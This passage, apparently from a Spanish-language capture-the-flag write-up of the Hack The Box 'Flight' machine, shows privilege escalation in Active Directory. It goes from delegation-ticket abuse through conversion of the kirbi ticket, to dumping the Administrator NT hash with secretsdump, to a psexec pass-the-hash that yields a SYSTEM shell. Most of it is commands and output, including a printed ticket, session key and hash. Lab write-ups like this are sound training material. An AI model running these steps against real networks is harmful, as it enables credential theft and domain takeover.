[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: AioA1mRXFW8yBHizW5DU0eVYS6oGUNpgGD7pX3cJgl8=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECtjgt6Dovnvmg28FlZqhlD2lt9Ruq+aBg3+W1fmZEoc8boFmL5/uFK3f8mXIkV8e4/TeGtUdzMItOeJHSMOE5xKvQ+n/vfdVNR238EiHTEp3ba9wb08HDaZ2DnBiuInk/hWAsHTtAA4U6RkH+RbJ0k9owxCV4kM2wjB9lyqkiHFnpBhEEPrywD1lkdrBPkYzZNMn1HTPIIOnu4fwy1M/BuyUXLvqWgDGUQJYqM6wzUMrCCetELyVZAkjXKaeBZtCeCqLC62g8g0jB5CnSF2NvHpDWiMmQ6JmnUMGYCskhlIUf+oGgcHzMhKKz4vufSL4Ef1ut64EmE72xQBi68+k5ClklfpSjodAZ1ujhSKFBO/cgnu9GUN2tJrMnAFzkGBgfaE6X983mROYVg9Z1zEyOmro3YkF07lrsdpuhnAYltE1TKz20lBoRSg3VTE4V8ObWnIWhjzjoE40f1oJlHXtT7PznrmYppeGnihw8SUKfkCJFYY9etb3mdmgkWYanlwQdMMMChD3IyJ08zhS4B1qis2zjBoejeTX9k2bfNrcwoj+0kUdhkGpSChy7XFO5oToN4XVQgnl0lBR2KefpHBo8njDYfMMfb0o39W9UE3KRuUyQbLS97hspQeDwsE9zf+CXzl5bbGAFWqasrOrcGuU/1oxA9MjLIClEYPf8Sqlfp64NTysp3veAlhgyLWA8ekSodyi3iscHE7zrIvlIeDwHwXdsBcDLli3BlaYEoDT1gfW+sgSpWEwKsjzPgSvnPPTV9ZESUUzPY1IWzIMbN5ex1gnzb7OLjZlxyTsGp94en13WdZNkf0fjQ8JnfVjjFqpvWESHeq9joc0xoJI7T7if+PRy92EZ60G8VeAcrQcYpMH/k1HcitURLnog/d35bl2CCI0oD9cSwpJyXHi0LZqmBVB7yTM4VFrM7LeSmgqeQfZVhs4dcuONaSnd8YdOpvW34uzn8BamNGZuqQF/cgX1IQrztzerYAHiY/+eC1Mrlsw1arGGvJ2jAi9bjsShiqAVfHhtn7ZQ/iTPCzkBLY7z5py0AGMtuZrAbeZwLEwjjEi3/PBNGLU/wlmF6uUfxO/+/mCBH0OXntfvciMWw67Gg3op27bmuQMTGjJInOOJFHTCEpnPWPB0gBXmH7dHDclLxhxRsmi+ZBqDF45DScEHg+fjZJtNZdk9kshMiS1HeormP4lKnViduFmB65cruH8w8CPLcmJh5ntQwPak/FYuinUWc1u1Gs45KD1E753vj37t6TDLzuabGwsoO9H66RbFQUxgXgBEP9UKs8C0LICODYsc7MKhfB6VfgWqVDDTVUxGqW+N7ousDM7p3GZ/2iMB8/idwnzE/kvN651c6WQDNdejX9jZ84xU6fzo4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgBaT1y6q0nkLEIKh5hP7loHYDdjmxy50jIiaSxbJMiKKhDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDIzMTAxNTE3MjEyNVqmERgPMjAyMzEwMTYwMzIxMjVapxEYDzIwMjMxMDIyMTcyMTI1WqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
```

Está en formato ```kirbi``` (El propio de Windows) y para poder operar con él desde mi Kali hay que pasarlo a ```ccache``` (El propio de linux). Copio el contenido en base64 como ```ticket.kirbi``` y le hago un decode

```null
cat ticket.kirbi | base64 -d | sponge ticket.kirbi
```

Con la herramienta de ```ticketConverter.py``` de ```impacket``` lo cambio de formato

```null
ticketConverter.py ticket.kirbi ticket.ccache
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done
```

Setteo la variable de entorno ```KRB5CCNAME```

```null
export KRB5CCNAME=ticket.ccache 
```

Me sincronizo con la hora del ```DC```

```null
ntpdate flight.htb
```

Dumpeo el hash NT del usuario ```Administrator```

```null
secretsdump.py -k -no-pass g0.flight.htb | grep -i 500
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
```

Hago ```PassTheHash``` y me conecto como ```nt authority\system```. Puedo ver la segunda flag

```null
psexec.py flight.htb/Administrator@10.10.11.187 -no-pass -hashes ':43bbfc530bab76141b12c8446e30c17c'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.11.187.....
[*] Found writable share ADMIN$
[*] Uploading file nkDhBsSh.exe
[*] Opening SVCManager on 10.10.11.187.....
[*] Creating service nUQn on 10.10.11.187.....
[*] Starting service nUQn.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
106386de7e75973f95a71cd2513481cb
```